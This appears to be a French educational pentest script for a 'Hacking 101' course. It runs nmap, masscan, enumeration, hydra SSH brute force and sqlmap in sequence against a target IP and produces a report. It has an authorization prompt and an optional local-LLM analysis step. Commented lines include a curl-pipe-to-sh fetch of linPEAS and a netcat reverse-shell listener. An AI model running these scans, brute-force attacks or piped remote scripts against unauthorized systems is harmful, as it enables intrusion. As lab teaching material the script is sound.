#!/usr/bin/env python3
"""
Tisseur — cours Hacking 101

Tisse ensemble les outils des modules (Reconnaissance, Scanning,
Énumération, Exploitation, Outils Avancés) : il les exécute UN PAR
UN, en attendant que chaque étape soit complètement terminée avant
de passer à la suivante, puis tisse tous les résultats en un seul
rapport final (.md).

TROIS FAÇONS DE LE LANCER :
    python3 tisseur.py                          -> menu interactif (terminal)
    python3 tisseur.py --gui                    -> interface graphique (fenêtre)
    python3 tisseur.py --target <ip> [options]  -> mode direct (scripts/automatisation)

EXEMPLES (mode direct) :
    python3 tisseur.py --target 192.168.56.102
    python3 tisseur.py --target 192.168.56.102 --modules Reconnaissance,Scanning
    python3 tisseur.py --target 192.168.56.102 --url http://192.168.56.102:8080
    python3 tisseur.py --target 192.168.56.102 --ia          # + analyse IA locale
    python3 tisseur.py --guide

ANALYSE IA (optionnelle) : avec --ia, une IA LOCALE (Ollama ou llama.cpp,
sur ta propre machine, rien n'est envoyé sur Internet) lit le rapport et te
conseille les prochaines étapes. Elle n'exécute jamais de commande elle-même.
    Ollama    : https://ollama.com  ->  ollama run llama3
    llama.cpp : ./llama-server -m modele.gguf   (port 8080)

L'interface graphique a besoin de Tkinter. Sur Kali, si c'est pas
déjà installé : sudo apt install python3-tk

⚠️ À utiliser seulement sur des machines que tu possèdes ou que t'as
le droit explicite de tester (ton lab Metasploitable2, etc.)
"""

import argparse
import subprocess
import sys
import os
import glob
import shutil
import html
import datetime
import threading
import queue
import json
import urllib.request
import urllib.error

# ============================================================
# BANNIÈRE ASCII (terminal) — figlet "slant", même rouge que le logo
# ============================================================
RESET = "\033[0m"
ROUGE = "\033[1;38;2;232;17;45m"   # #E8112D (gardé pour compat)

# ============================================================
# PALETTE LEXOS-PRO (terminal ami) — thème néon sur fond noir
# ============================================================
NOIR_HEX = "#0A0A0A"          # fond principal
NOIR_SIDE_HEX = "#070707"     # fond panneau latéral
TEXTE_HEX = "#EDEDED"         # texte principal
TEXTE2_HEX = "#D4D4D4"        # texte champs
MUTED_HEX = "#A3A3A3"         # texte secondaire
BORDURE_HEX = "#222222"       # bordures
ACCENT_HEX = "#4D8DFF"        # accent principal (réseau/bleu)

# Couleurs par usage (hex) — reprises du mockup Terminal LEXOS-PRO
C_NET = "#4D8DFF"   # réseau / accent
C_OK = "#39FF88"    # succès
C_ERR = "#FF4D6D"   # erreur
C_DEL = "#FF9F1C"   # suppression / alerte
C_HELP = "#FFD23F"  # aide / guide
C_DL = "#B46BFF"    # téléchargement
C_SCAN = "#22D3EE"  # scan
C_GAMER = "#FF2BD6" # accent rose

# Couleur néon attribuée à chaque module
MODULE_COULEURS = {
    "Reconnaissance": C_SCAN,
    "Scanning": C_NET,
    "Énumération": C_HELP,
    "Exploitation": C_ERR,
    "Outils avancés": C_DL,
}


def _ansi(hex_color):
    """Transforme un #RRGGBB en séquence ANSI truecolor (texte, gras)."""
    h = hex_color.lstrip("#")
    r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
    return f"\033[1;38;2;{r};{g};{b}m"


def colore(texte, hex_color, actif=True):
    """Entoure le texte de couleur ANSI si le terminal le supporte."""
    return f"{_ansi(hex_color)}{texte}{RESET}" if actif else texte


# Accent principal du terminal, en ANSI (remplace l'ancien rouge au démarrage)
ACCENT = _ansi(ACCENT_HEX)
ROUGE_HEX = ACCENT_HEX  # alias conservé pour le reste du code GUI

SIGNATURE = "Alex Marceau Prévost · Produit au Lac-Saint-Jean 🫐"

LOGO_TISSEUR = r"""
  ____________________ ________  ______
 /_  __/  _/ ___/ ___// ____/ / / / __ \
  / /  / / \__ \\__ \/ __/ / / / / /_/ /
 / / _/ / ___/ /__/ / /___/ /_/ / _, _/
/_/ /___//____/____/_____/\____/_/ |_|
"""


def print_banner():
    use_color = sys.stdout.isatty()
    lines = LOGO_TISSEUR.strip("\n").split("\n")
    width = max(len(l) for l in lines)

    for line in lines:
        print(colore(line, ACCENT_HEX, use_color))

    tagline = "— tisse tes commandes de pentest, une à la fois —"
    tagline = tagline.center(width)
    print(colore(tagline, C_SCAN, use_color))

    signature = SIGNATURE.center(width)
    print(colore(signature, MUTED_HEX, use_color))
    print()


# ============================================================
# CONFIGURATION DES ÉTAPES
# (module, nom, commande) — {target} et {url} sont remplacés
# automatiquement. Une ligne commentée (#) = pas exécutée par
# défaut, parce qu'elle a besoin d'un setup différent (expliqué
# juste à côté). Décommente-la une fois ce setup fait.
# ============================================================
STEPS = [
    # ---------------- RECONNAISSANCE ----------------
    ("Reconnaissance", "Ping", "ping -c 4 {target}"),
    ("Reconnaissance", "Whois", "whois {target}"),
    # theHarvester sert à chercher des emails/sous-domaines d'un NOM DE
    # DOMAINE public (ex: exemple.com), pas d'une IP de lab privé :
    # ("Reconnaissance", "theHarvester", "theHarvester -d {target} -b all"),

    # ---------------- SCANNING ----------------
    ("Scanning", "Nmap - scan complet (ports + versions)", "nmap -sV -sC -p- {target}"),
    ("Scanning", "Masscan - scan rapide tous ports", "masscan -p1-65535 {target} --rate=1000"),
    # Legion = GUI qui automatise nmap + plein d'outils d'énumération
    # tout seul (fork de Sparta). C'est une interface graphique à part,
    # pas lançable en une ligne de commande comme les autres — tu le
    # démarres pis tu rentres l'IP dedans directement :
    #   legion

    # ---------------- ÉNUMÉRATION ----------------
    ("Énumération", "SMB enum", "enum4linux -a {target}"),
    ("Énumération", "Dossiers/fichiers web (gobuster)", "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"),
    ("Énumération", "Scan vulnérabilités web (nikto)", "nikto -h {url}"),
    ("Énumération", "SNMP walk", "snmpwalk -v2c -c public {target}"),

    # ---------------- EXPLOITATION ----------------
    ("Exploitation", "Hydra - brute force SSH", "hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://{target}"),
    ("Exploitation", "sqlmap - test injection SQL", "sqlmap -u {url} --batch --banner"),
    # Metasploit s'automatise avec un "resource script" (.rc) préparé
    # d'avance — remplace mon_script.rc par le tien :
    # ("Exploitation", "Metasploit (resource script)", "msfconsole -q -r mon_script.rc"),
    # Burp Suite est surtout un outil interactif (proxy GUI) — pas
    # vraiment automatisable dans un pipeline CLI comme celui-ci.

    # ---------------- POST-EXPLOITATION ----------------
    # Ces étapes supposent que t'as DÉJÀ un accès/shell sur la machine
    # (donc après l'étape Exploitation, une fois dedans) — à rouler
    # manuellement dans ce shell, pas dans ce pipeline automatique :
    #   linPEAS (énum. de privilege escalation Linux, dans Metasploitable2) :
    #     curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
    #   netcat (reverse shell) : nc -lvnp 4444   (sur ta Kali, en écoute)
    #   Mimikatz : outil propre à Windows/Active Directory — ne s'applique
    #   pas à Metasploitable2, qui est du Linux.

    # ---------------- OUTILS AVANCÉS ----------------
    ("Outils avancés", "Capture réseau (tcpdump, 15s)", "timeout 15 tcpdump -i eth0 -w capture.pcap"),
    # John / Hashcat ont besoin d'un FICHIER DE HASH en entrée (pas
    # juste une IP) — à utiliser une fois que t'as récupéré des hash :
    # ("Outils avancés", "John the Ripper", "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"),
    # ("Outils avancés", "Hashcat", "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"),
    # Aircrack-ng s'applique au WIFI (interface sans fil en mode
    # monitor), pas à une cible réseau filaire comme Metasploitable2 :
    # ("Outils avancés", "Aircrack-ng", "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap"),
    # Wifite = automatise les attaques wifi (WEP/WPA/WPS) en enchaînant
    # plusieurs outils (aircrack-ng, reaver, etc.) tout seul. Même chose
    # que Aircrack-ng : demande une interface wifi en mode monitor, pas
    # une IP — remplace {interface} par la tienne (ex: wlan0) :
    # ("Outils avancés", "Wifite", "wifite -i {interface} --kill"),
]


def run_step(module, name, cmd_template, target, url, report_lines, output=print, results=None):
    cmd = cmd_template.format(target=target, url=url)
    coul = MODULE_COULEURS.get(module, ACCENT_HEX)
    # On ne colore (ANSI) que la sortie terminal ; la fenêtre reçoit du texte brut.
    use_color = (output is print) and sys.stdout.isatty()

    output(colore("=" * 60, BORDURE_HEX, use_color))
    output(colore(f"[{module}] {name}", coul, use_color))
    output(colore(f"Commande : {cmd}", MUTED_HEX, use_color))
    output(colore("=" * 60, BORDURE_HEX, use_color) + "\n")

    report_lines.append(f"\n## [{module}] {name}\n")
    report_lines.append(f"Commande : `{cmd}`\n")
    report_lines.append("```")

    out_text = ""
    try:
        # subprocess.run() BLOQUE et attend que la commande soit
        # complètement terminée avant de rendre la main — c'est ça
        # qui garantit que les étapes se font une à la fois, en ordre.
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=600
        )
        out_text = (result.stdout or "") + (result.stderr or "")
        output(out_text)
        report_lines.append(out_text.strip())
    except subprocess.TimeoutExpired:
        out_text = "⚠️ Étape interrompue (timeout de 10 minutes dépassé)"
        output(out_text)
        report_lines.append(out_text)
    except Exception as e:
        out_text = f"⚠️ Erreur pendant cette étape : {e}"
        output(out_text)
        report_lines.append(out_text)

    report_lines.append("```")

    if results is not None:
        results.append({"module": module, "name": name, "cmd": cmd, "output": out_text.strip()})


def run_pipeline(target, url, modules_str, output=print, ia=None,
                 assume_yes=False, html_out=False, chat=False, mission=""):
    url = url or f"http://{target}"
    wanted_modules = [m.strip() for m in modules_str.split(",")] if modules_str else None

    steps_to_run = [s for s in STEPS if wanted_modules is None or s[0] in wanted_modules]

    if not steps_to_run:
        output("Aucune étape ne correspond aux modules demandés.")
        output("Modules disponibles : " + ", ".join(sorted(set(s[0] for s in STEPS))))
        return None

    tty = (output is print) and sys.stdout.isatty()

    # Confirmation d'autorisation (éthique) avant tout.
    if not confirmer_autorisation(target, assume_yes=assume_yes, output=output):
        return None

    # Vérification des outils (avertit sans bloquer).
    verifier_outils(steps_to_run, output=output)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    report_lines = [f"# Rapport Tisseur — Cible : {target}", f"Généré le {timestamp}\n"]
    if mission and mission.strip():
        report_lines.append(f"**Mission :** {mission.strip()}\n")
    results = []

    output(colore(f"🧵 Tisseur démarré sur la cible {target}", C_NET, tty))
    output(colore(f"{len(steps_to_run)} étape(s) à exécuter, une par une.", MUTED_HEX, tty) + "\n")

    for module, name, cmd_template in steps_to_run:
        run_step(module, name, cmd_template, target, url, report_lines, output=output, results=results)

    filename = (
        f"tisseur_rapport_{target.replace('.', '_')}_"
        f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    )
    with open(filename, "w") as f:
        f.write("\n".join(report_lines))

    output(colore("=" * 60, BORDURE_HEX, tty))
    output(colore(f"✅ Tisseur terminé. Rapport sauvegardé : {filename}", C_OK, tty))
    output(colore("=" * 60, BORDURE_HEX, tty))

    # Analyse IA optionnelle : on relit le rapport et on demande à une IA
    # LOCALE de le résumer et de conseiller les prochaines étapes.
    analyse = None
    if ia:
        analyse = analyse_ia("\n".join(report_lines), ia, output=output, mission=mission)
        if analyse:
            with open(filename, "a") as f:
                f.write("\n\n---\n\n## 🤖 Analyse IA\n\n")
                f.write(analyse.strip() + "\n")

    # Rapport HTML optionnel.
    if html_out:
        filename_html = filename[:-3] + ".html"
        with open(filename_html, "w") as f:
            f.write(generer_html(target, timestamp, results, analyse=analyse))
        output(colore(f"📄 Rapport HTML : {filename_html}", C_DL, tty))

    # Notification de fin (best-effort).
    notifier("🧵 Tisseur terminé", f"Rapport prêt pour {target}")

    # Chat IA optionnel (terminal seulement : besoin de input()).
    if chat and ia and tty:
        chat_ia("\n".join(report_lines), ia, mission=mission)

    return filename



# ============================================================
# ANALYSE IA LOCALE (Ollama ou llama.cpp)
# ------------------------------------------------------------
# L'IA tourne EN LOCAL sur ta machine (aucune donnée envoyée sur
# Internet). Elle LIT le rapport et te CONSEILLE — elle n'exécute
# jamais de commande elle-même.
#
#   Ollama     : https://ollama.com  ->  ollama run llama3
#                API : http://localhost:11434
#   llama.cpp  : serveur ./llama-server -m modele.gguf
#                API : http://localhost:8080
# ============================================================
IA_DEFAUTS = {
    "ollama":   {"url": "http://localhost:11434", "modele": "llama3"},
    "llamacpp": {"url": "http://localhost:8080",  "modele": ""},
}

PROMPT_IA = """Tu es un mentor en cybersécurité pour le cours « Hacking 101 ».
On te donne le rapport d'un scan de pentest effectué sur un LAB D'ENTRAÎNEMENT
AUTORISÉ (une machine Metasploitable2 ou équivalente que l'étudiant possède et a
le droit de tester).
{mission}
Analyse ce rapport et réponds EN FRANÇAIS, de façon claire et pédagogique :

1. RÉSUMÉ — les hôtes, ports ouverts, services et versions détectés.
2. FAILLES POTENTIELLES — les vulnérabilités probables, de la plus à la moins
   prioritaire, avec une courte explication de chacune.
3. PROCHAINES ÉTAPES — quoi explorer ensuite pour apprendre, en restant dans le
   cadre d'un lab autorisé.

Reste factuel : base-toi sur ce qui est RÉELLEMENT dans le rapport. Ne donne pas
d'instructions pour attaquer des systèmes non autorisés.

===== RAPPORT =====
{rapport}
===== FIN DU RAPPORT =====
"""


def _bloc_mission(mission):
    """Bloc 'rapport de mission' injecté dans les prompts pour diriger l'IA."""
    if mission and mission.strip():
        return ("\nRAPPORT DE MISSION (objectif fixé par l'étudiant — oriente tes "
                "réponses en fonction) :\n" + mission.strip() + "\n")
    return ""


def _ia_config(ia):
    """Normalise le dict `ia` -> (moteur, url, modele)."""
    moteur = ia.get("moteur", "ollama")
    defauts = IA_DEFAUTS.get(moteur, IA_DEFAUTS["ollama"])
    url = (ia.get("url") or defauts["url"]).rstrip("/")
    modele = ia.get("modele") or defauts["modele"]
    return moteur, url, modele


def _ia_generate(prompt, ia, timeout=300):
    """Envoie un prompt à l'IA locale et renvoie le texte. Lève en cas d'échec.

    Partagé par l'analyse automatique et le chat.
    """
    moteur, url, modele = _ia_config(ia)
    if moteur == "ollama":
        endpoint = f"{url}/api/generate"
        payload = {"model": modele, "prompt": prompt, "stream": False}
    else:  # llamacpp
        endpoint = f"{url}/completion"
        payload = {"prompt": prompt, "n_predict": 768, "stream": False}

    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        endpoint, data=data, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        body = json.loads(resp.read().decode("utf-8"))
    # Ollama -> "response" ; llama.cpp -> "content"
    return (body.get("response") or body.get("content") or "").strip()


def _ia_message_erreur(moteur, modele, raison, output, tty):
    """Message d'aide commun quand l'IA locale ne répond pas."""
    output(colore(f"⚠️ Impossible de joindre l'IA locale ({moteur}) : {raison}", C_DEL, tty))
    if moteur == "ollama":
        output("   Démarre Ollama d'abord :  ollama run " + (modele or "llama3"))
        output("   (installe-le sur https://ollama.com si ce n'est pas fait)")
    else:
        output("   Démarre le serveur llama.cpp d'abord :")
        output("   ./llama-server -m ton_modele.gguf  (écoute sur le port 8080)")


def analyse_ia(rapport, ia, output=print, mission=""):
    """Envoie le rapport à une IA locale et renvoie son analyse (texte).

    `ia` est un dict : {"moteur": "ollama"|"llamacpp", "modele": str, "url": str}.
    `mission` : objectif optionnel pour orienter l'IA.
    Renvoie None en cas d'échec (après avoir affiché une explication).
    """
    moteur, url, modele = _ia_config(ia)
    tty = (output is print) and sys.stdout.isatty()
    output("")
    output(colore(f"🤖 Analyse IA locale ({moteur}) en cours…", C_GAMER, tty))

    # On tronque le rapport pour ne pas dépasser le contexte du modèle.
    prompt = PROMPT_IA.format(mission=_bloc_mission(mission), rapport=rapport[:12000])

    try:
        texte = _ia_generate(prompt, ia)
        if not texte:
            output(colore("⚠️ L'IA a répondu, mais sans texte exploitable.", C_DEL, tty))
            return None

        output(colore("=" * 60, BORDURE_HEX, tty))
        output(colore("🤖 ANALYSE IA", C_GAMER, tty))
        output(colore("=" * 60, BORDURE_HEX, tty))
        output(texte)
        return texte

    except urllib.error.URLError as e:
        _ia_message_erreur(moteur, modele, e.reason, output, tty)
        return None
    except Exception as e:
        output(colore(f"⚠️ Erreur pendant l'analyse IA : {e}", C_DEL, tty))
        return None


# ============================================================
# CHAT IA — commande /chat (terminal)
# ------------------------------------------------------------
# Poser des questions à l'IA locale sur un rapport. Tape /quit
# (ou q) pour sortir.
# ============================================================
PROMPT_CHAT = """Tu es un mentor en cybersécurité du cours « Hacking 101 ». Tu
réponds aux questions d'un étudiant à propos d'un scan fait sur son LAB
D'ENTRAÎNEMENT AUTORISÉ. Réponds EN FRANÇAIS, bref et pédagogique, en te basant
sur le rapport ci-dessous. Ne donne pas d'instructions pour attaquer des
systèmes non autorisés.
{mission}
===== RAPPORT =====
{rapport}
===== FIN DU RAPPORT =====

Question de l'étudiant : {question}
Réponse :"""


def chat_ia(rapport, ia, mission=""):
    """Boucle de chat (terminal) : pose des questions à l'IA sur le rapport."""
    moteur, url, modele = _ia_config(ia)
    tty = sys.stdout.isatty()

    print(colore("=" * 60, BORDURE_HEX, tty))
    print(colore(f"💬 Chat IA ({moteur}) — pose tes questions sur le rapport.", C_GAMER, tty))
    print(colore("   Tape /quit (ou q) pour sortir.", MUTED_HEX, tty))
    print(colore("=" * 60, BORDURE_HEX, tty))

    rapport_court = rapport[:12000]
    bloc_mission = _bloc_mission(mission)
    while True:
        try:
            question = input(colore("\n💬 toi > ", C_SCAN, tty)).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not question:
            continue
        if question.lower() in ("/quit", "/exit", "q", "quit", "exit"):
            print(colore("Fin du chat. 🫐", MUTED_HEX, tty))
            break

        prompt = PROMPT_CHAT.format(mission=bloc_mission, rapport=rapport_court, question=question)
        try:
            reponse = _ia_generate(prompt, ia)
            print(colore("\n🤖 ia  > ", C_GAMER, tty) + (reponse or "(pas de réponse)"))
        except urllib.error.URLError as e:
            _ia_message_erreur(moteur, modele, e.reason, print, tty)
            break
        except Exception as e:
            print(colore(f"⚠️ Erreur : {e}", C_DEL, tty))


# ============================================================
# VÉRIFICATION DES OUTILS (avant de lancer)
# ============================================================
# outil -> nom du paquet quand il diffère du nom de l'outil (par gestionnaire)
OUTIL_PAQUET = {
    "snmpwalk": {"apt": "snmp"},
    "ping": {"apt": "iputils-ping"},
}


def detect_gestionnaire():
    """Retourne 'pkg' (Termux), 'apt' (Debian/Kali) ou 'autre'."""
    if "com.termux" in os.environ.get("PREFIX", "") and shutil.which("pkg"):
        return "pkg"
    if shutil.which("apt-get") or shutil.which("apt"):
        return "apt"
    return "autre"


def _outil_de_commande(cmd_template):
    """Extrait le nom de l'outil principal d'une commande (gère 'timeout N outil')."""
    toks = cmd_template.split()
    if toks and toks[0] == "timeout":
        for t in toks[1:]:
            if not t.isdigit():
                return t
    return toks[0] if toks else ""


def _paquet(outil, gest):
    return OUTIL_PAQUET.get(outil, {}).get(gest, outil)


def verifier_outils(steps, output=print):
    """Affiche quels outils des étapes sont installés, et comment installer
    ceux qui manquent. Renvoie la liste des outils manquants."""
    tty = (output is print) and sys.stdout.isatty()
    gest = detect_gestionnaire()

    outils = []
    for _module, _name, cmd in steps:
        o = _outil_de_commande(cmd)
        if o and o not in outils:
            outils.append(o)

    output(colore("🔍 Vérification des outils nécessaires :", C_SCAN, tty))
    manquants = []
    for o in outils:
        if shutil.which(o):
            output("   " + colore(f"✅ {o}", C_OK, tty))
        else:
            manquants.append(o)
            output("   " + colore(f"❌ {o}  (manquant)", C_ERR, tty))

    if manquants:
        output("")
        output(colore(f"{len(manquants)} outil(s) manquant(s) — ces étapes échoueront.", C_DEL, tty))
        if gest in ("apt", "pkg"):
            paquets = " ".join(_paquet(o, gest) for o in manquants)
            cmd_install = ("sudo " if gest == "apt" else "") + f"{gest} install {paquets}"
            output("   Pour les installer :")
            output("   " + colore(cmd_install, C_HELP, tty))
        else:
            output("   Installe-les avec le gestionnaire de paquets de ton système.")
    else:
        output(colore("   Tous les outils sont là. 👌", C_OK, tty))
    output("")
    return manquants


# ============================================================
# CONFIRMATION D'AUTORISATION (éthique)
# ============================================================
def confirmer_autorisation(target, assume_yes=False, output=print):
    """Demande confirmation avant de scanner. Renvoie True si on peut lancer."""
    if assume_yes:
        return True
    tty = (output is print) and sys.stdout.isatty()
    # Non interactif (script) sans --oui : on refuse par prudence.
    if not (sys.stdin and sys.stdin.isatty()):
        output(colore("⚠️ Autorisation non confirmée (mode non interactif).", C_DEL, tty))
        output("   Relance avec --oui SI tu as le droit explicite de tester cette cible.")
        return False
    print(colore(
        f"⚠️  As-tu l'autorisation EXPLICITE de tester {target} ? (o/N) : ", C_DEL, tty
    ), end="")
    rep = input().strip().lower()
    if rep in ("o", "oui", "y", "yes"):
        return True
    print(colore("Annulé. Teste seulement ce que tu possèdes ou as le droit de tester.", MUTED_HEX, tty))
    return False


# ============================================================
# NOTIFICATIONS (best-effort : Termux, Linux, macOS)
# ============================================================
def notifier(titre, message):
    """Notification système si un outil est dispo ; sinon, silencieux."""
    try:
        if shutil.which("termux-notification"):
            subprocess.run(["termux-notification", "--title", titre, "--content", message],
                           timeout=10, capture_output=True)
        elif shutil.which("notify-send"):
            subprocess.run(["notify-send", titre, message], timeout=10, capture_output=True)
        elif sys.platform == "darwin" and shutil.which("osascript"):
            subprocess.run(
                ["osascript", "-e", f'display notification "{message}" with title "{titre}"'],
                timeout=10, capture_output=True,
            )
    except Exception:
        pass  # une notif qui échoue ne doit jamais casser le pipeline


# ============================================================
# RAPPORT HTML (thème néon LEXOS)
# ============================================================
def generer_html(target, timestamp, results, analyse=None):
    """Construit un rapport HTML stylé à partir des résultats structurés."""
    def esc(s):
        return html.escape(s or "")

    sections = []
    for r in results:
        coul = MODULE_COULEURS.get(r["module"], ACCENT_HEX)
        sections.append(f"""
      <section class="etape">
        <h2 style="color:{coul}">[{esc(r['module'])}] {esc(r['name'])}</h2>
        <div class="cmd">$ {esc(r['cmd'])}</div>
        <pre>{esc(r['output']) or '(aucune sortie)'}</pre>
      </section>""")

    bloc_ia = ""
    if analyse:
        bloc_ia = f"""
      <section class="etape ia">
        <h2 style="color:{C_GAMER}">🤖 Analyse IA</h2>
        <pre>{esc(analyse)}</pre>
      </section>"""

    return f"""<!doctype html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Rapport Tisseur — {esc(target)}</title>
<style>
  :root {{ color-scheme: dark; }}
  body {{ background:{NOIR_HEX}; color:{TEXTE_HEX};
         font-family:ui-monospace,Consolas,monospace; margin:0; padding:24px; }}
  header {{ border-bottom:1px solid {BORDURE_HEX}; padding-bottom:16px; margin-bottom:16px; }}
  h1 {{ color:{ACCENT_HEX}; margin:0 0 4px; }}
  .sign {{ color:{MUTED_HEX}; font-size:.9em; }}
  .meta {{ color:{C_SCAN}; font-size:.9em; }}
  .etape {{ background:{NOIR_SIDE_HEX}; border:1px solid {BORDURE_HEX};
            border-radius:8px; padding:12px 16px; margin:14px 0; }}
  .etape h2 {{ margin:0 0 8px; font-size:1.05em; }}
  .cmd {{ color:{MUTED_HEX}; margin-bottom:8px; }}
  pre {{ background:#070707; color:{TEXTE2_HEX}; padding:12px; border-radius:6px;
         overflow-x:auto; white-space:pre-wrap; word-break:break-word; margin:0; }}
  .ia pre {{ border-left:3px solid {C_GAMER}; }}
  footer {{ color:{MUTED_HEX}; font-size:.85em; margin-top:24px;
            border-top:1px solid {BORDURE_HEX}; padding-top:12px; }}
</style>
</head>
<body>
  <header>
    <h1>🧵 Rapport Tisseur</h1>
    <div class="meta">Cible : {esc(target)} · Généré le {esc(timestamp)}</div>
    <div class="sign">{esc(SIGNATURE)}</div>
  </header>
  {''.join(sections)}
  {bloc_ia}
  <footer>⚠️ À utiliser seulement sur des machines que tu possèdes ou que t'as le droit de tester.</footer>
</body>
</html>"""


def dernier_rapport():
    """Renvoie le chemin du rapport .md le plus récent (ou None)."""
    fichiers = sorted(glob.glob("tisseur_rapport_*.md"), key=os.path.getmtime, reverse=True)
    return fichiers[0] if fichiers else None




# ============================================================
# GUIDE — texte brut, utilisé par le terminal ET la fenêtre GUI
# ============================================================
def get_guide_text():
    modules_info = [
        ("Reconnaissance", "ping, whois"),
        ("Scanning", "nmap (scan complet), masscan (scan rapide)"),
        ("Énumération", "enum4linux, gobuster, nikto, snmpwalk"),
        ("Exploitation", "hydra (brute force SSH), sqlmap (injection SQL)"),
        ("Outils avancés", "tcpdump (capture réseau)"),
    ]
    lines = []
    lines.append("GUIDE — TISSEUR")
    lines.append("=" * 56)
    lines.append("")
    lines.append("COMMANDE DE BASE (mode direct) :")
    lines.append("  python3 tisseur.py --target <ip>")
    lines.append("")
    lines.append("MODULES :")
    for nom, outils in modules_info:
        lines.append(f"  {nom:<16} : {outils}")
    lines.append("  Sans sélection, les 5 modules roulent au complet.")
    lines.append("")
    lines.append("URL POUR LES OUTILS WEB :")
    lines.append("  Par défaut : http://<target>")
    lines.append("  Précise-la si ton appli web est sur un autre port")
    lines.append("  (ex: http://192.168.56.102:8080)")
    lines.append("")
    lines.append("ÉTAPES COMMENTÉES DANS LE CODE (désactivées par défaut) :")
    lines.append("  theHarvester, Legion, Metasploit, Burp Suite, linPEAS,")
    lines.append("  netcat, John the Ripper, Hashcat, Aircrack-ng, Wifite —")
    lines.append("  elles ont besoin d'un setup différent d'une simple IP")
    lines.append("  (hash, interface wifi, resource script...). Ouvre")
    lines.append("  tisseur.py, section STEPS, pour l'explication de chacune")
    lines.append("  et comment l'activer.")
    lines.append("")
    lines.append("⚠️  À utiliser seulement sur des machines que tu possèdes")
    lines.append("    ou que t'as le droit explicite de tester.")
    lines.append("")
    lines.append(SIGNATURE)
    return "\n".join(lines)


def show_guide_terminal():
    use_color = sys.stdout.isatty()
    for line in get_guide_text().split("\n"):
        if use_color and (line.startswith("GUIDE") or line.startswith("=")):
            print(colore(line, C_HELP))
        elif use_color and line.strip().startswith("⚠"):
            print(colore(line, C_DEL))
        else:
            print(line)
    print()


# ============================================================
# MENU INTERACTIF (terminal)
# ============================================================
def _demander_moteur_ia():
    """Demande le moteur IA et le modèle (terminal). Renvoie un dict `ia`."""
    moteur = input("Moteur IA — 1) Ollama (défaut)  2) llama.cpp : ").strip()
    moteur = "llamacpp" if moteur == "2" else "ollama"
    modele = None
    if moteur == "ollama":
        modele = input("Modèle Ollama (défaut: llama3) : ").strip() or None
    return {"moteur": moteur, "modele": modele, "url": None}


def _oui(question):
    return input(question).strip().lower() in ("o", "oui", "y", "yes")


def _demander_options():
    """Demande les options de fin de scan. Renvoie (ia, html, chat, mission)."""
    mission = input("Rapport de mission / objectif (optionnel, pour diriger l'IA) : ").strip()
    ia = _demander_moteur_ia() if _oui("Analyse IA locale à la fin ? (o/N) : ") else None
    html_out = _oui("Générer aussi un rapport HTML ? (o/N) : ")
    chat = bool(ia) and _oui("Ouvrir le chat IA après le scan ? (o/N) : ")
    return ia, html_out, chat, mission


def lancer_chat_sur_dernier_rapport(ia=None, mission=""):
    """Ouvre le chat IA sur le rapport le plus récent (commande /chat)."""
    tty = sys.stdout.isatty()
    path = dernier_rapport()
    if not path:
        print(colore("Aucun rapport trouvé — lance d'abord un scan.", C_DEL, tty))
        return
    print(colore(f"Rapport chargé : {path}", MUTED_HEX, tty))
    if not mission:
        mission = input("Rapport de mission / objectif (optionnel) : ").strip()
    if ia is None:
        ia = _demander_moteur_ia()
    with open(path) as f:
        rapport = f.read()
    chat_ia(rapport, ia, mission=mission)


def interactive_menu():
    print_banner()
    while True:
        print("1) Lancer le pipeline complet")
        print("2) Choisir des modules spécifiques")
        print("3) Chat IA sur le dernier rapport  (/chat)")
        print("4) Interface graphique")
        print("5) Guide / Aide")
        print("6) Quitter")
        choix = input("\n> ").strip()

        if choix == "1":
            target = input("IP de la cible : ").strip()
            if target:
                ia, html_out, chat, mission = _demander_options()
                run_pipeline(target, None, None, ia=ia, html_out=html_out, chat=chat, mission=mission)
            break
        elif choix == "2":
            target = input("IP de la cible : ").strip()
            mods = input("Modules (séparés par virgule, ex: Reconnaissance,Scanning) : ").strip()
            if target:
                ia, html_out, chat, mission = _demander_options()
                run_pipeline(target, None, mods or None, ia=ia, html_out=html_out, chat=chat, mission=mission)
            break
        elif choix == "3" or choix.lower() == "/chat":
            lancer_chat_sur_dernier_rapport()
        elif choix == "4":
            launch_gui()
            break
        elif choix == "5":
            show_guide_terminal()
        elif choix == "6":
            print("À la prochaine !")
            break
        else:
            print("Choix invalide, réessaie.\n")


# ============================================================
# INTERFACE GRAPHIQUE (Tkinter — tourne sur ton appareil, pas
# besoin du terminal une fois lancée)
# ============================================================
def launch_gui():
    try:
        import tkinter as tk
        from tkinter import scrolledtext, messagebox
    except ImportError:
        print("Tkinter n'est pas installé.")
        print("Sur Kali/Debian : sudo apt install python3-tk")
        sys.exit(1)

    class TisseurApp:
        def __init__(self, root):
            self.root = root
            root.title("Tisseur")
            root.configure(bg=NOIR_HEX)
            root.geometry("820x660")

            self.msg_queue = queue.Queue()

            tk.Label(
                root, text="TISSEUR", font=("Arial Black", 30, "bold"),
                fg=ACCENT_HEX, bg=NOIR_HEX,
            ).pack(pady=(14, 0))
            tk.Label(
                root, text="tisse tes commandes de pentest, une à la fois",
                font=("Arial", 10, "italic"), fg=C_SCAN, bg=NOIR_HEX,
            ).pack(pady=(0, 0))
            tk.Label(
                root, text=SIGNATURE,
                font=("Arial", 9), fg=MUTED_HEX, bg=NOIR_HEX,
            ).pack(pady=(0, 10))

            form = tk.Frame(root, bg=NOIR_HEX)
            form.pack(fill="x", padx=16)

            entry_style = dict(bg="#161616", fg=TEXTE_HEX, insertbackground=ACCENT_HEX,
                               relief="flat", highlightthickness=1,
                               highlightbackground=BORDURE_HEX, highlightcolor=ACCENT_HEX)

